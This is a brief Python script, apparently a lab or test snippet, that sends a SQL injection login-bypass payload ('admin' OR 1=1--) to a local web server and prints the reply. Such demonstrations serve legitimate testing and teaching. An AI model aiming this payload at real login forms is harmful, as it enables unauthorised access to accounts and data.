import requests

# Simulate SQL injection attack
url = "http://localhost:8080"
payload = {"username": "admin' OR 1=1--", "password": "password"}
response = requests.post(url, data=payload)
print(f"Attack response ({response.status_code}):\n{response.text}")